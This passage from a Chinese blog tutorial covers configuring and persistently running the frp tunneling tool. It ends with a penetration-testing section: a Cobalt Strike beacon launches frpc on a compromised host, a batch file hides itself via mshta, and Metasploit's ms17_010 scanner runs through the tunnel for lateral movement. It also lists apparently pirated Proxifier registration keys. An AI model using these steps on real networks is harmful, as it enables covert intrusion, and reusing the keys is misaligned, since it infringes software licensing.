class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># [common] 是必需的</span></span><br><span class=\"line\">[common]</span><br><span class=\"line\"><span class=\"comment\"># ipv6的文本地址或主机名必须括在方括号中</span></span><br><span class=\"line\"><span class=\"comment\"># 如\"[::1]:80\", \"[ipv6-host]:http\" 或 \"[ipv6-host%zone]:80\"</span></span><br><span class=\"line\">server_addr = 0.0.0.0</span><br><span class=\"line\">server_port = 7000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 认证 token</span></span><br><span class=\"line\">token = 12345678</span><br><span class=\"line\"><span class=\"comment\"># 如果 tls_enable 为 true, frpc 将会通过 tls 连接 frps</span></span><br><span class=\"line\">tls_enable = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 用于连接到服务器的通信协议，目前支持 tcp/kcp/websocket, 默认 tcp</span></span><br><span class=\"line\">protocol = tcp</span><br><span class=\"line\"><span class=\"comment\"># 将提前建立连接，默认值为 0</span></span><br><span class=\"line\">pool_count = 5</span><br><span class=\"line\"><span class=\"comment\"># 是否使用 tcp 流多路复用，默认值为 true，必需与服务端相同</span></span><br><span class=\"line\">tcp_mux = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 决定第一次登录失败时是否退出程序，否则继续重新登录到 frps默认为 true</span></span><br><span class=\"line\">login_fail_exit = <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 控制台或真实日志文件路径，如./frps.log</span></span><br><span class=\"line\">log_file = ./frpc.log</span><br><span class=\"line\"><span class=\"comment\"># 日志级别，分为trace（跟踪）、debug（调试）、info（信息）、warn（警告）、error（错误）</span></span><br><span class=\"line\">log_level = info</span><br><span class=\"line\"><span class=\"comment\"># 最大日志记录天数</span></span><br><span class=\"line\">log_max_days = 3</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置能够通过 http api 控制客户端操作的管理地址</span></span><br><span class=\"line\"><span class=\"comment\"># admin_addr = 127.0.0.1</span></span><br><span class=\"line\"><span class=\"comment\"># admin_port = 7400</span></span><br><span class=\"line\"><span class=\"comment\"># admin_user = admin</span></span><br><span class=\"line\"><span class=\"comment\"># admin_pwd = admin</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 心跳配置, 不建议对默认值进行修改</span></span><br><span class=\"line\"><span class=\"comment\"># heartbeat_interval 默认为 10 heartbeat_timeout 默认为 90</span></span><br><span class=\"line\"><span class=\"comment\"># heartbeat_interval = 30</span></span><br><span class=\"line\"><span class=\"comment\"># heartbeat_timeout = 90</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 代理名, 使用 ',' 分隔 默认为空, 表示全部代理</span></span><br><span class=\"line\"><span class=\"comment\"># start = ssh,dns</span></span><br><span class=\"line\"><span class=\"comment\"># 在此处设置用户名后，代理名称将设置为  &#123;用户名&#125;.&#123;代理名&#125;</span></span><br><span class=\"line\"><span class=\"comment\"># user = your_name</span></span><br><span class=\"line\"><span class=\"comment\"># 如果要通过 http 代理或 socks5 代理连接 frps，可以在此处或全局代理中设置 http_proxy 只支持 tcp协议</span></span><br><span class=\"line\"><span class=\"comment\"># http_proxy = http://user:passwd@192.168.1.128:8080</span></span><br><span class=\"line\"><span class=\"comment\"># http_proxy = socks5://user:passwd@192.168.1.128:1080</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 指定 DNS 服务器</span></span><br><span class=\"line\"><span class=\"comment\"># dns_server = 8.8.8.8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 'ssh' 是一个特殊代理名称</span></span><br><span class=\"line\">[ssh]</span><br><span class=\"line\"><span class=\"comment\"># 协议 tcp | udp | http | https | stcp | xtcp, 默认 tcp</span></span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 22</span><br><span class=\"line\"><span class=\"comment\"># 是否加密, 默认为 false</span></span><br><span class=\"line\">use_encryption = <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否压缩</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 服务端端口</span></span><br><span class=\"line\">remote_port = 6001</span><br><span class=\"line\"><span class=\"comment\"># frps 将为同一组中的代理进行负载平衡连接</span></span><br><span class=\"line\">group = test_group</span><br><span class=\"line\"><span class=\"comment\"># 组应该有相同的组密钥</span></span><br><span class=\"line\">group_key = 123456</span><br><span class=\"line\"><span class=\"comment\"># 为后端服务开启健康检查, 目前支持 'tcp' 和 'http' </span></span><br><span class=\"line\"><span class=\"comment\"># frpc 将连接本地服务的端口以检测其健康状态</span></span><br><span class=\"line\">health_check_type = tcp</span><br><span class=\"line\"><span class=\"comment\"># 健康检查连接超时</span></span><br><span class=\"line\">health_check_timeout_s = 3</span><br><span class=\"line\"><span class=\"comment\"># 连续 3 次失败, 代理将会从服务端中被移除</span></span><br><span class=\"line\">health_check_max_failed = 3</span><br><span class=\"line\"><span class=\"comment\"># 健康检查时间间隔</span></span><br><span class=\"line\">health_check_interval_s = 10</span><br><span class=\"line\"></span><br><span class=\"line\">[ssh_random]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 22</span><br><span class=\"line\"><span class=\"comment\"># 如果 remote_port 为 0 ,frps 将为您分配一个随机端口，设置为其它端口则是frps服务器地址:2222 </span></span><br><span class=\"line\">remote_port = 2222 </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果要暴露多个端口, 在区块名称前添加 'range:' 前缀</span></span><br><span class=\"line\"><span class=\"comment\"># frpc 将会生成多个代理，如 'tcp_port_6010', 'tcp_port_6011'</span></span><br><span class=\"line\">[range:tcp_port]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 6010-6020,6022,6024-6028</span><br><span class=\"line\">remote_port = 6010-6020,6022,6024-6028</span><br><span class=\"line\">use_encryption = <span class=\"literal\">false</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">[dns]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = udp</span><br><span class=\"line\">local_ip = 114.114.114.114</span><br><span class=\"line\">local_port = 53</span><br><span class=\"line\">remote_port = 6002</span><br><span class=\"line\">use_encryption = <span class=\"literal\">false</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">[range:udp_port]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = udp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 6010-6020</span><br><span class=\"line\">remote_port = 6010-6020</span><br><span class=\"line\">use_encryption = <span class=\"literal\">false</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将域名解析到 [server_addr] 可以使用 http://web01.yourdomain.com 访问 web01</span></span><br><span class=\"line\">[web01]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = http</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 80</span><br><span class=\"line\">use_encryption = <span class=\"literal\">false</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># http 协议认证</span></span><br><span class=\"line\">http_user = admin</span><br><span class=\"line\">http_pwd = admin</span><br><span class=\"line\"><span class=\"comment\"># 如果服务端域名为 frps.com, 可以通过 http://test.frps.com 来访问 [web01] </span></span><br><span class=\"line\">subdomain = web01</span><br><span class=\"line\">custom_domains = web02.yourdomain.com</span><br><span class=\"line\"><span class=\"comment\"># locations 仅可用于HTTP类型</span></span><br><span class=\"line\">locations = /,/pic</span><br><span class=\"line\">host_header_rewrite = example.com</span><br><span class=\"line\"><span class=\"comment\"># params with prefix \"header_\" will be used to update http request headers</span></span><br><span class=\"line\">header_X-From-Where = frp</span><br><span class=\"line\">health_check_type = http</span><br><span class=\"line\"><span class=\"comment\"># frpc 将会发送一个 GET http 请求 '/status' 来定位http服务</span></span><br><span class=\"line\"><span class=\"comment\"># http 服务返回 2xx 状态码时即为存活</span></span><br><span class=\"line\">health_check_url = /status</span><br><span class=\"line\">health_check_interval_s = 10</span><br><span class=\"line\">health_check_max_failed = 3</span><br><span class=\"line\">health_check_timeout_s = 3</span><br><span class=\"line\"></span><br><span class=\"line\">[web02]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = https</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 8000</span><br><span class=\"line\">use_encryption = <span class=\"literal\">false</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">false</span></span><br><span class=\"line\">subdomain = web01</span><br><span class=\"line\">custom_domains = web02.yourdomain.com</span><br><span class=\"line\"><span class=\"comment\"># v1 或 v2 或 空</span></span><br><span class=\"line\">proxy_protocol_version = v2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#插件掩饰</span></span><br><span class=\"line\">[plugin_unix_domain_socket]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">remote_port = 6003</span><br><span class=\"line\">plugin = unix_domain_socket</span><br><span class=\"line\">plugin_unix_path = /var/run/docker.sock</span><br><span class=\"line\"></span><br><span class=\"line\">[plugin_http_proxy]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">remote_port = 6004</span><br><span class=\"line\">plugin = http_proxy</span><br><span class=\"line\">plugin_http_user = abc</span><br><span class=\"line\">plugin_http_passwd = abc</span><br><span class=\"line\"></span><br><span class=\"line\">[plugin_socks5]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">remote_port = 6005</span><br><span class=\"line\">plugin = socks5</span><br><span class=\"line\">plugin_user = abc</span><br><span class=\"line\">plugin_passwd = abc</span><br><span class=\"line\"></span><br><span class=\"line\">[plugin_static_file]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">remote_port = 6006</span><br><span class=\"line\">plugin = static_file</span><br><span class=\"line\">plugin_local_path = /var/www/blog</span><br><span class=\"line\">plugin_strip_prefix = static</span><br><span class=\"line\">plugin_http_user = abc</span><br><span class=\"line\">plugin_http_passwd = abc</span><br><span class=\"line\"></span><br><span class=\"line\">[plugin_https2http]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = https</span><br><span class=\"line\">custom_domains = test.yourdomain.com</span><br><span class=\"line\">plugin = https2http</span><br><span class=\"line\">plugin_local_addr = 127.0.0.1:80</span><br><span class=\"line\">plugin_crt_path = ./server.crt</span><br><span class=\"line\">plugin_key_path = ./server.key</span><br><span class=\"line\">plugin_host_header_rewrite = 127.0.0.1</span><br><span class=\"line\"></span><br><span class=\"line\">[secret_tcp]</span><br><span class=\"line\"><span class=\"comment\"># 如果类型为 secret tcp, remote_port 将失效</span></span><br><span class=\"line\"><span class=\"built_in\">type</span> = stcp</span><br><span class=\"line\"><span class=\"comment\"># sk 用来进行访客认证</span></span><br><span class=\"line\">sk = abcdefg</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 22</span><br><span class=\"line\">use_encryption = <span class=\"literal\">false</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 访客端及服务端的用户名应该相同 (frpc的角色访客)</span></span><br><span class=\"line\">[secret_tcp_visitor]</span><br><span class=\"line\"><span class=\"comment\"># frpc role visitor -&gt; frps -&gt; frpc role server</span></span><br><span class=\"line\">role = visitor</span><br><span class=\"line\"><span class=\"built_in\">type</span> = stcp</span><br><span class=\"line\"><span class=\"comment\"># 要访问的服务器名称</span></span><br><span class=\"line\">server_name = secret_tcp</span><br><span class=\"line\">sk = abcdefg</span><br><span class=\"line\"><span class=\"comment\"># 将此地址连接到访客 stcp 服务器</span></span><br><span class=\"line\">bind_addr = 127.0.0.1</span><br><span class=\"line\">bind_port = 9000</span><br><span class=\"line\">use_encryption = <span class=\"literal\">false</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">[p2p_tcp]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = xtcp</span><br><span class=\"line\">sk = abcdefg</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 22</span><br><span class=\"line\">use_encryption = <span class=\"literal\">false</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">[p2p_tcp_visitor]</span><br><span class=\"line\">role = visitor</span><br><span class=\"line\"><span class=\"built_in\">type</span> = xtcp</span><br><span class=\"line\">server_name = p2p_tcp</span><br><span class=\"line\">sk = abcdefg</span><br><span class=\"line\">bind_addr = 127.0.0.1</span><br><span class=\"line\">bind_port = 9001</span><br><span class=\"line\">use_encryption = <span class=\"literal\">false</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n<p><br></p>\n<h4 id=\"0x04-进阶配置\"><a href=\"#0x04-进阶配置\" class=\"headerlink\" title=\"0x04 进阶配置\"></a>0x04 进阶配置</h4><h5 id=\"1-后台启动\"><a href=\"#1-后台启动\" class=\"headerlink\" title=\"1.后台启动\"></a>1.后台启动</h5><p>描述:我们为了不每次重启机器后都需要手动的进行打开frp服务或者说客户端，我们需要将其作为服务进行运行，主要针对于Windows和Linux进行操作;</p>\n<ul>\n<li>Linux 后台运行方式<br>方式1：后台运行启动(加入到/etc/init.d/中即可)</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#nohup COMMAND &amp;  (&amp; ： 指在后台运行 , nohup ： 不挂断的运行，注意并没有后台运行的功能) </span></span><br><span class=\"line\"><span class=\"comment\">#注意:nohup没有后台运行的意思；&amp;才是后台运行</span></span><br><span class=\"line\">nohup /path/fprs -c /path/frps.ini &gt; /tmp/frps.logs&amp;</span><br><span class=\"line\"><span class=\"comment\">#验证启动</span></span><br><span class=\"line\">ps -ef|grep frps   或者 lsof -i:7000</span><br></pre></td></tr></table></figure>\n<p>方式2：服务启动方式(可以使用systemctl的方式管理frps)<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">touch /lib/systemd/system/frps.service</span><br><span class=\"line\">cat &gt;&gt; /lib/systemd/system/frps.service &lt;&lt;EOF</span><br><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Frps Service</span><br><span class=\"line\">After=network.target syslog.target</span><br><span class=\"line\">Wants=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=simple</span><br><span class=\"line\"><span class=\"comment\">#启动服务的命令（此处写你的frps的实际安装目录）</span></span><br><span class=\"line\">ExecStart=/your/path/frps -c /your/path/frps.ini</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></p>\n<p>方式3:使用supervisor来控制<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#安装supervisor</span></span><br><span class=\"line\">sudo apt install supervisor   <span class=\"comment\">#Ubuntu</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">#创建 supervisor frps 配置文件,在 /etc/supervisor/conf.d 创建 frp.conf</span></span><br><span class=\"line\">[program:frp]</span><br><span class=\"line\"><span class=\"built_in\">command</span> = /your/path/frps -c /your/path/frps.ini</span><br><span class=\"line\">autostart = <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#重新加载一下supervisor</span></span><br><span class=\"line\"><span class=\"comment\">#重启supervisor</span></span><br><span class=\"line\">sudo systemctl restart supervisor</span><br><span class=\"line\"><span class=\"comment\">#查看supervisor运行状态</span></span><br><span class=\"line\">sudo supervisorctl status</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><p>Windows服务自启动<br>方式1：bat方式放入Windows启动目录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"built_in\">echo</span> off</span><br><span class=\"line\">Title Frps</span><br><span class=\"line\">d:\\frps\\frps.exe -c frps.ini</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Win7~10</span></span><br><span class=\"line\">C:\\Users\\用户名\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</span><br><span class=\"line\">C:\\Users\\WEIYIG~1\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</span><br></pre></td></tr></table></figure>\n<p>方式2:服务启动项（将bat打包或者直接利用其它编程语言调用）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#sc 命令services.msc进行设置与计划任务相互检测</span></span><br><span class=\"line\">sc create FrpServer binpath= F:\\frpsConfig.exe <span class=\"built_in\">type</span>= own start= auto displayname= FrpServer</span><br></pre></td></tr></table></figure>\n<p>方式3:计划任务在系统启动时（登录前）运行frpc</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#创建任务-&gt;唱歌-&gt;触发器-&gt;操作添加参数</span></span><br><span class=\"line\"><span class=\"comment\"># 方式1: client</span></span><br><span class=\"line\">cmd /c <span class=\"string\">\"start /b frpc.exe -c frpc.ini\"</span>  <span class=\"comment\">#起始直接运行默认就是以frpc.ini为默认文件</span></span><br><span class=\"line\"><span class=\"comment\"># 方式2: Server 起始于 F:\\Temp\\frp\\</span></span><br><span class=\"line\">powershell.exe Start-Process <span class=\"string\">\"frps.exe\"</span> -ArgumentList <span class=\"string\">'-c frps.ini'</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img.weiyigeek.top/2019/1/20191230155444.png\" alt=\"WeiyiGeek.\"></p>\n</li>\n</ul>\n<hr>\n\n<h4 id=\"0x05-联合使用\"><a href=\"#0x05-联合使用\" class=\"headerlink\" title=\"0x05 联合使用\"></a>0x05 联合使用</h4><p>描述:Frp可以很好的与Cobalt Strike和MSF联合使用,进行后渗透测试;</p>\n<ul>\n<li><ol>\n<li>CS 持续维权<figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">beacon&gt; sleep <span class=\"number\">10</span></span><br><span class=\"line\">beacon&gt; execute c:/frpc.exe -c c:/frpc.ini</span><br><span class=\"line\">beacon&gt; shell netstat -ano |<span class=\"built_in\">findstr</span> <span class=\"number\">7007</span></span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"built_in\">echo</span> off</span><br><span class=\"line\"><span class=\"keyword\">if</span> \"%<span class=\"number\">1</span>\" == \"h\" <span class=\"keyword\">goto</span> begin</span><br><span class=\"line\">mshta vbscript:createobject(\"wscript.shell\").run(\"%~nx0 h\",<span class=\"number\">0</span>)(window.close)&amp;&amp;<span class=\"keyword\">exit</span> </span><br><span class=\"line\">:begin</span><br><span class=\"line\">calc.exe</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>MSF方式:<br>当“专属通道”打通后，可直接在msf中挂该代理。因为msf的模块较多，所以在内网横向移动中更是一把利器<code>若socks5设置口令，可结合proxychains</code>。<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo msfconsole -q</span><br><span class=\"line\">msf5 &gt; setg proxies socks5:frp.xxxx.online:9066  <span class=\"comment\">#proxies 实用</span></span><br><span class=\"line\">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class=\"line\">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class=\"built_in\">set</span> threads 10</span><br><span class=\"line\">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class=\"built_in\">set</span> rhosts 192.168.144.178</span><br><span class=\"line\">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n</li>\n<li><p>其它Proxy全局流量代理软件结合实用(shadowsocks/Proxifier/proxychains(Kail))</p>\n<ul>\n<li>SSTap官方网址：<a href=\"https://www.sockscap64.com/\" target=\"_blank\" rel=\"noopener\">https://www.sockscap64.com/</a><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#SSTap下载地址：https://www.i5seo.com/1/SSTap.7z</span></span><br><span class=\"line\">Setup file MD5: 3a22361e0a94db8c42dfedb25a890688</span><br><span class=\"line\">Setup file SHA1: 4C82004B53ED569AB45078CDCC55DA7B50FEDA8C</span><br><span class=\"line\"></span><br><span class=\"line\">certutil -hashfile .\\SSTap-beta-setup-1.1.0.1.exe SHA1</span><br><span class=\"line\">SHA1 的 .\\SSTap-beta-setup-1.1.0.1.exe 哈希:</span><br><span class=\"line\">4c82004b53ed569ab45078cdcc55da7b50feda8c</span><br></pre></td></tr></table></figure></li>\n<li>Proxifier 全局流量转发软件（需要进注册使用）<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows便携版：官网地址：https://www.proxifier.com/distr/ProxifierSetup.exe</span><br><span class=\"line\">Windows安装版：官网地址：https://www.proxifier.com/distr/ProxifierSetup.exe</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#注册码</span></span><br><span class=\"line\">5EZ8G-C3WL5-B56YG-SCXM9-6QZAP</span><br><span class=\"line\">G3ZC7-7YGPY-FZD3A-FMNF9-ENTJB</span><br><span class=\"line\">YTZGN-FYT53-J253L-ZQZS4-YLBN9</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<p>总体思路: 一个中心三个辅助，CS总控中心, frp 作为数据通信隧道, ,proxychains 代理服务,msf/NMAP进行扫描攻击获取 session 后再转给 CS;</p>\n<hr>\n\n<h4 id=\"0x06-总结\"><a href=\"#0x06-总结\" class=\"headerlink\" title=\"0x06 总结\"></a>0x06 总结</h4><p>描述:Frp与reGeorg之间的比较说明;</p>\n<ul>\n<li>利用难度：前者需要获取机器执行命令的权限,后者需要上传专用的Shell到网站中(常用)</li>\n<li>利用环境: 前者要求入侵服务器能够访问外部网络以及需要一台公网IP的服务器运行服务端，后者不需要就如同正反向 shell 的差别</li>\n<li>功能对比: 前者提供提供繁多功能,后者代理访问内网但是相比弱爆了；</li>\n<li>性能对比: 从 frp 支持负载均衡和点对点传输上简直完爆其他内网穿透工具;</li>\n</ul>\n","comments":true,"excerpt":"[TOC]","categories":[{"name":"网络穿透","path":"api/categories/网络穿透.json"}],"tags":[{"name":"Frp","path":"api/tags/Frp.json"}]}